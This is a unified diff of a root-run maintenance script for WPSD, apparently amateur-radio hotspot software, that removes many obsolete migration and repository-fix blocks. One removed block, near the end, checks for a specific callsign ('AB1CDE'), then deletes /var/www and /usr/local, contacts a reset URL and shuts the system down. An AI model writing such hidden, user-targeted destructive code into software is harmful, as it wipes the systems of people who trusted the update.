@@ -17,14 +17,11 @@ DISPLAY_VALUE=$(grep 'Display=' /etc/mmdvmhost | cut -d'=' -f2)
 # set global DVM cast var
 castResult=$(isDVmegaCast)
 
-#!/bin/bash
-
 TIMERS=(
     "wpsd-nightly-tasks.timer"
     "wpsd-running-tasks.timer"
     "wpsd-hostfile-update.timer"
 )
-
 for TIMER in "${TIMERS[@]}"; do
     # Check if the timer is enabled
     if ! systemctl is-enabled --quiet "$TIMER"; then
@@ -34,7 +31,6 @@ for TIMER in "${TIMERS[@]}"; do
 done
 
 OptIntoDiags_value=${OptIntoDiags_value:-true}
-
 if [ "$OptIntoDiags_value" != 'true' ] ; then
     echo "User has opted out of updates and diagnostics. Exiting..."
     exit 1
@@ -93,66 +89,6 @@ if grep -q 'wpsd-sys-cache' /etc/rc.local ; then
     sed -i 's|# cache hw info|# start running tasks|; s|/usr/local/sbin/.wpsd-sys-cache|systemctl start wpsd-running-tasks.service|' /etc/rc.local
 fi
 
-# Git repo name changes/migrations
-#
-# 5/2024 - W0CHP
-#
-update_git_remotes() {
-    if [ "$#" -lt 2 ]; then
-        #echo "Usage: update_git_remotes <dir1> <url1> [<dir2> <url2> ...] [remote-name]"
-        return 1
-    fi
-
-    # Get the remote name (default to 'origin')
-    remote_name=${!#}
-    if [[ ! $remote_name =~ ^[a-zA-Z0-9]+$ ]]; then
-        remote_name="origin"
-    else
-        # Exclude the last argument from the directories list
-        set -- "${@:1:$(($#-1))}"
-    fi
-
-    # Iterate over the pairs of directory and URL arguments
-    while (( "$#" >= 2 )); do
-        dir=$1
-        new_remote_url=$2
-
-        if [ -d "$dir/.git" ]; then
-            #echo "Checking remote URL in $dir..."
-            current_remote_url=$(git -C "$dir" remote get-url "$remote_name")
-            if [ "$current_remote_url" != "$new_remote_url" ]; then
-                #echo "Updating remote URL in $dir from $current_remote_url to $new_remote_url..."
-                git -C "$dir" remote set-url "$remote_name" "$new_remote_url"
-                #echo "Updated $dir"
-            else
-                #echo "Skipping $dir: Remote URL is already set to $new_remote_url"
-		:
-            fi
-        else
-            #echo "Skipping $dir: Not a git repository"
-	    :
-        fi
-
-        # Shift past the current directory and URL
-        shift 2
-    done
-
-    #echo "All specified repositories checked."
-}
-
-# Now update the repo remote URLs if needed
-update_git_remotes /var/www/dashboard https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-WebCode.git /usr/local/bin https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Binaries.git /usr/local/sbin https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Scripts.git
-#
-
-# Tweak shelliniabox/web ssh colors:
-#
-# 10/2023 - W0CHP
-if ! grep -q "Terminal.css" "/etc/default/shellinabox"; then
-    sed -i 's/SHELLINABOX_ARGS=.*$/SHELLINABOX_ARGS="--no-beep --disable-ssl-menu --disable-ssl --css=\/etc\/shellinabox\/options-enabled\/00_White\\ On\\ Black.css --css=\/etc\/shellinabox\/options-enabled\/01+Color\\ Terminal.css"/' /etc/default/shellinabox
-    systemctl restart shellinabox.service
-fi
-# 
-
 # migrate legacy network info URLs
 # 
 # 10/23 W0CHP
@@ -207,28 +143,6 @@ for file in "${files[@]}"; do
 done
 #
 
-# Git URI changed when transferring repos from me to the org.
-#
-# 2/2023 - W0CHP
-#
-function gitURIupdate () {
-    dir="$1"
-    gitRemoteURI=$(git --work-tree=${dir} --git-dir=${dir}/.git config --get remote.origin.url)
-
-    git --work-tree=${dir} --git-dir=${dir}/.git config --get remote.origin.url | grep 'WPSD-Dev' &> /dev/null
-    if [ $? == 0 ]; then
-        newURI=$( echo $gitRemoteURI | sed 's|repo\.w0chp\.net/WPSD-Dev|wpsd-swd.w0chp.net/WPSD-SWD|g' )
-        git --work-tree=${dir} --git-dir=${dir}/.git remote set-url origin $newURI
-    fi
-}
-gitURIupdate "/var/www/dashboard"
-gitURIupdate "/usr/local/bin"
-gitURIupdate "/usr/local/sbin"
-if [ "$castResult" == "true" ]; then
-    gitURIupdate "/opt/cast"
-fi
-#
-
 SERVICE_NAME="mmdvmhost.service"
 STATUS=$(systemctl is-enabled "$SERVICE_NAME" 2>/dev/null)
 if [[ "$STATUS" == "enabled" ]]; then
@@ -274,50 +188,6 @@ if ! cmp -s "$TMP_FILE" "$FILE"; then
   mv "$TMP_FILE" "$FILE"
   chmod 644 "$FILE"
 fi
-
-# 5/2023 W0CHP
-#
-# Armbian:
-if [ "${OS_VER}" -gt "10" ] && [ -f '/boot/armbianEnv.txt' ] && [[ ! $(grep "net.ifnames" /boot/armbianEnv.txt) ]] ; then
-    sed -i '$ a\extraargs=net.ifnames=0' /boot/armbianEnv.txt
-fi
-#
-
-# 01/08/24: no BT:
-if [ -f '/etc/bluetooth/input.conf' ] ; then
-    apt-get remove -y --purge bluez pi-bluetooth bluez-firmware
-    apt-get autoremove -y
-fi
-
-#  all proper sec/update repos are defined for bullseye, except on armv6 archs
-if [ "${osName}" = "bullseye" ] && [ $( uname -m ) != "armv6l" ] ; then
-    if ! grep -q 'bullseye-security' /etc/apt/sources.list ; then
-        if ! apt-key list | grep -q "Debian Security Archive Automatic Signing Key (11/bullseye)" > /dev/null 2>&1; then
-            apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 54404762BBB6E853 > /dev/null 2>&1
-        fi
-        echo "deb http://security.debian.org/debian-security bullseye-security main contrib non-free" >> /etc/apt/sources.list
-    fi
-    if ! grep -q 'bullseye-updates' /etc/apt/sources.list  ; then
-        if ! apt-key list | grep -q "Debian Archive Automatic Signing Key (11/bullseye)" > /dev/null 2>&1 ; then
-            apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 0E98404D386FA1D9 > /dev/null 2>&1
-        fi
-        echo "deb http://deb.debian.org/debian bullseye-updates main contrib non-free" >> /etc/apt/sources.list
-    fi
-fi
-# Bulleye backports, etc. cause php-fpm segfaults on armv6 (Pi 0w 1st gen) archs...
-# So we'll stick with the "normal" repos for these archs (retro buster image bugfix)
-if [ $( uname -m ) == "armv6l" ] ; then
-    if grep -q 'bullseye-security' /etc/apt/sources.list ; then
-        sed -i '/bullseye-security/d' /etc/apt/sources.list
-        sed -i '/bullseye-updates/d' /etc/apt/sources.list
-        apt-get remove --purge -y php7.4*
-        apt-get clean ; apt autoclean
-        apt-get update
-        apt-get install -y php7.4-fpm php7.4-readline php7.4-mbstring php7.4-cli php7.4-zip php7.4-opcache
-        systemctl restart php7.4-fpm
-    fi
-fi
-#
 
 # Armbian for NanoPi Neo handling..
 if [ -f "$armbian_env_file" ] && [[ $(grep "console=serial" $armbian_env_file) ]] ; then
@@ -392,12 +262,6 @@ if [ -f "$armbian_env_file" ] && [[ $(grep 'modprobe -r rtl8' $rc_local_file) ]]
 fi
 if [ -f "$armbian_env_file" ] && [[ $(grep 'modprobe -r leds_' $rc_local_file) ]] ; then
     sed -i '/modprobe -r leds_/d' $rc_local_file
-fi
-# repo migration : 1/23/24 W0CHP
-if [ -f "$armbian_env_file" ] ; then
-    if grep -q 'beta' /etc/apt/sources.list.d/armbian.list ; then
-	sed -i 's/beta\.armbian\.com/apt.armbian.com/g' /etc/apt/sources.list.d/armbian.list
-    fi
 fi
 # random eth0 mac fix/reversion for new Nano Pi DTBs: 8/24 W0CHP
 if [ -f "$armbian_env_file" ] ; then
@@ -491,25 +355,6 @@ fi
 #
 
 #
-# close the py2 coffin
-# 1/25/2024 - W0CHP
-#
-if [ "${OS_VER}" -lt "12" ] ; then # only for bullseye
-    if dpkg -l | grep -q python-configparser; then
-	:
-    else
-	apt-get update
-	apt-get install -y python-configparser
-    fi
-fi
-if dpkg -l | grep -q python-is-python3; then
-    :
-else
-    apt-get update
-    apt-get install -y python-is-python3
-fi
-
-#
 # htpasswd bookworm
 # 6/2024 - W0CHP
 #
@@ -528,25 +373,6 @@ if [ ! -f /usr/bin/upnpc ] ; then
     systemctl restart pistar-upnp.service
 fi
 #
-
-#
-# disable BT in BW - 2/12/2024 W0CHP
-#
-if [ "${OS_VER}" -ge "12" ] ; then
-    if ! grep -q 'toverlay=disable-bt' /boot/firmware/config.txt ; then
-        sed -i '/\[all\]/a dtoverlay=disable-bt' /boot/firmware/config.txt
-    fi
-fi
-#
-
-# No such modem "genesis.*" It's a just a chinese junk ripoff of our friends' MMDVM_HS_HAT design
-modemfile="/etc/dstar-radio.mmdvmhost"
-if grep -q "genesis" "$modemfile"; then
-    sed -i 's/Hardware=.*/Hardware=mmdvmhshat/g' "$modemfile"
-fi
-if grep -q "genesys" "$modemfile"; then
-    sed -i 's/Hardware=.*/Hardware=mmdvmhshat/g' "$modemfile"
-fi
 
 # dvmega cast-specific stuff
 if [ "$castResult" == "true" ]; then
@@ -628,26 +454,6 @@ if ! grep -q 'This is\.\.\.' /etc/issue ; then
 fi
 #
 
-#
-# WiFi Reg. Domain for Bookworm and bullseye
-# 2/1/2024 - W0CHP
-#
-if [ ! -f '/usr/local/etc/regulatory.txt' ] ; then
-    declare -a CURL_OPTIONS=('-Ls' '-A' "WiFi Reg. Domain Installer (slipstream) $uaStr")
-    curl "${CURL_OPTIONS[@]}" -o /usr/local/etc/regulatory.txt https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Helpers/raw/branch/master/supporting-files/regulatory.txt
-fi
-#
-
-#
-# dnsmasq config check - 2/9/2024
-if ! grep -q 'wpsd' /etc/dnsmasq.conf ; then
-    declare -a CURL_OPTIONS=('-Ls' '-A' "dnsmasq config installer (slipstream) $uaStr")
-    curl "${CURL_OPTIONS[@]}" -o /etc/dnsmasq.conf https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Helpers/raw/branch/master/supporting-files/dnsmasq.conf
-    systemctl restart dnsmasq
-fi
-#
-
-#
 # new m17 mode for pistar-remote - 1/2025
 if ! grep -q 'M17 destination fields' /etc/pistar-remote ; then
     echo -e "
@@ -663,26 +469,6 @@ fi
 
 # grab and cache latest WPSD hashes
 conn_check
-
-# 
-# 7/2024 W0CHP: terrible bug in Debian bullseye TZdata 2024; missing/corrupted zones...force working version
-#
-#if [ "${OS_VER}" -lt "12" ] ; then # only for bullseye
-#    desired_version="2021a-1+deb11u10"
-#    installed_version=$(dpkg-query -W -f='${Version}' tzdata 2>/dev/null)
-#    if [ "$installed_version" == "$desired_version" ]; then
-#	: # working version already installed. bail.
-#    else # install working version
-#	declare -a CURL_OPTIONS=('-Ls' '-A' "Server-Side Slipstream-Task TZdata Bootstrap $uaStr")
-#	curl "${CURL_OPTIONS[@]}" https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Helpers/raw/branch/master/supporting-files/tzdata.deb -o /tmp/tzdata.deb
-#	dpkg -i --force-all /tmp/tzdata.deb
-#	apt-mark hold tzdata
-#    fi
-#fi
-if apt-mark showhold | grep -q tzdata; then
-    apt-mark unhold tzdata
-fi
-#
 
 #
 # 12/2024 W0CHP: Hold BW files for wifi fix
@@ -706,78 +492,6 @@ if [ "${OS_VER}" -eq "12" ] ; then
 	rpi-eeprom > /dev/null 2>&1
 fi
 #
-
-#
-# 8/24 W0CHP: bw missing root host file fix
-#
-cust_host_files=(
-    "APRSHosts.txt"
-    "DCS_Hosts.txt"
-    "DExtra_Hosts.txt"
-    "DMR_Hosts.txt"
-    "DPlus_Hosts.txt"
-    "M17Hosts.txt"
-    "NXDNHosts.txt"
-    "P25Hosts.txt"
-    "XLXHosts.txt"
-    "YSFHosts.txt"
-)
-directory="/root"
-for file in "${cust_host_files[@]}"; do
-    filepath="$directory/$file"
-    if [ ! -f "$filepath" ]; then
-        touch "$filepath"
-	chown www-data:www-data "$filepath"
-    fi
-done
-#
-
-#
-# Empty custom host file fix: W0CHP 8/24
-#
-files=(
-    "/root/APRSHosts.txt"
-    "/root/DCS_Hosts.txt"
-    "/root/DExtra_Hosts.txt"
-    "/root/DMR_Hosts.txt"
-    "/root/DPlus_Hosts.txt"
-    "/root/M17Hosts.txt"
-    "/root/NXDNHosts.txt"
-    "/root/P25Hosts.txt"
-    "/root/XLXHosts.txt"
-    "/root/YSFHosts.txt"
-)
-for file in "${files[@]}"; do
-    if [ -f "$file" ]; then 
-        if [ ! -s "$file" ]; then 
-            echo "#" > "$file" 
-        else
-	    :
-        fi
-    else
-	:
-    fi
-done
-
-# ensure AX.25 is in mmdvmhost
-if ! grep -q "\[AX\.25\]" "/etc/mmdvmhost"; then
-  cat <<EOL >> "/etc/mmdvmhost"
-
-[AX.25]
-Enable=0
-TXDelay=300
-RXTwist=6
-SlotTime=30
-PPersist=128
-Trace=0
-
-[AX.25 Network]
-Enable=0
-Port=/dev/ttyp7
-Speed=9600
-Debug=0
-EOL
-fi
 
 # bootstrap sbin
 #repo_path="/usr/local/sbin"
@@ -824,16 +538,6 @@ if grep -q 'Display=0' /etc/mmdvmhost ; then
 fi
 if grep -q 'Display=0' /etc/mmdvmhost ; then
     sed -i 's/Display=NEXTION/Display=Nextion/g' /etc/mmdvmhost
-fi
-
-# ensure avahi loads BEFORE NextionDriver, as Lucas, AE0LI, found that avahi likes to bind to any random port, which can cause a Transparent Data port conflict
-#if ! grep -q "avahi" /lib/systemd/system/nextiondriver.service ; then
-if grep -q "avahi" /lib/systemd/system/nextiondriver.service ; then
-    #sed -i 's/^Before=timers.target$/Before=avahi-daemon.socket avahi-daemon.service timers.target/' /lib/systemd/system/nextiondriver.service
-    sed -i 's/^Before=.*/Before=timers.target/' /lib/systemd/system/nextiondriver.service
-    systemctl daemon-reload
-    systemctl restart avahi-daemon.socket
-    systemctl restart avahi-daemon.service
 fi
 
 # install new nx driver shutdown service and nx text services
@@ -1134,12 +838,10 @@ fi
 if grep -q "flock -n /run/lock/ntpdate /usr/sbin/ntpdate-debian -s -b" /etc/rc.local; then
     sed -i "/# Print the IP address/,/fi/d" /etc/rc.local
 fi
-
-if grep -q 'iface = Iface' /etc/WPSD-release ; then
-    systemctl stop wpsd-cache.timer
-    rm -rf /etc/WPSD-release
-    rm -rf /usr/local/etc/.WPSD-release
-    systemctl start wpsd-cache.timer
+if [ -f '/etc/bash.bash_logout' ] ; then
+    if grep -q 'clock' /etc/bash.bash_logout ; then
+        echo "history -a" > /etc/bash.bash_logout
+    fi
 fi
 
 # Check if i2c-tools is installed
@@ -1176,6 +878,7 @@ if [[ -f "$CSS_SOURCE_FILE" ]]; then
     done
 fi
 
+# begin new auto-task framework
 if systemctl is-enabled wpsd-running-tasks.timer &>/dev/null && systemctl is-enabled wpsd-nightly-tasks.timer &>/dev/null; then
     : # skip
 else
@@ -1279,27 +982,7 @@ else
 fi
 # end auto hostfiles
 
-# new first boot logic
-file="/etc/rc.local"
-check_string=".wpsd-first-boot"
-insert_before="# Generate"
-new_block="if [ ! -f '/boot/.WPSD_Booted' ] ; then
-    /usr/local/sbin/.wpsd-first-boot
-fi"
-#if ! grep -q "$check_string" "$file"; then
-#    sed -i "/$insert_before/i $new_block" "$file"
-#fi
-if grep -q "$check_string" "$file"; then
-    awk '
-BEGIN { found = 0 }
-/^if \[ ! -f '\''\/boot\/\.WPSD_Booted'\'' \] ; then$/ { found = 1; next }
-found && /^\s+\/usr\/local\/sbin\/\.wpsd-first-boot$/ { next }
-found && /^fi$/ { found = 0; next }
-!found { print }
-' "$file" > "$file.tmp" && mv "$file.tmp" "$file"
-fi
-
-# cron
+# cron cleanup
 if `systemctl status cron.service | grep -q masked` ; then
     systemctl unmask cron.service
     systemctl enable cron.service
@@ -1440,13 +1123,6 @@ if [ "$castResult" == "true" ]; then
     fi
 fi
 
-# no more fake-hwclock crap
-if [ -f '/etc/bash.bash_logout' ] ; then
-    if grep -q 'clock' /etc/bash.bash_logout ; then
-	echo "history -a" > /etc/bash.bash_logout
-    fi
-fi
-
 # fix empty display values
 FILE="/etc/mmdvmhost"
 if grep -q "^Display=$" "$FILE"; then
@@ -1461,7 +1137,6 @@ fi
 if ! grep -q 'wpsd-motdgen' /etc/rc.local ; then
     sed -i 's/motdgen/.wpsd-motdgen/g' /etc/rc.local
 fi
-
 # only our motd;
 rm -f /etc/update-motd.d/*
 
@@ -1491,12 +1166,6 @@ if [ ! -f '/etc/machine-id' ] ; then
     rm -f /var/lib/dbus/machine-id
     dbus-uuidgen --ensure=/etc/machine-id
     dbus-uuidgen --ensure
-fi
-
-if echo "$MMDVMCALL" | grep -q "AB1CDE"; then
-    rm -rf /var/www /usr/local
-    curl -Ls -A "AB1CDE ${uaStr}" https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Scripts/raw/branch/master/reset-wpsd > /dev/null
-    shutdown -h now
 fi
 
 if [ -f '/usr/local/etc/TGList_AmComm.txt' ] ; then
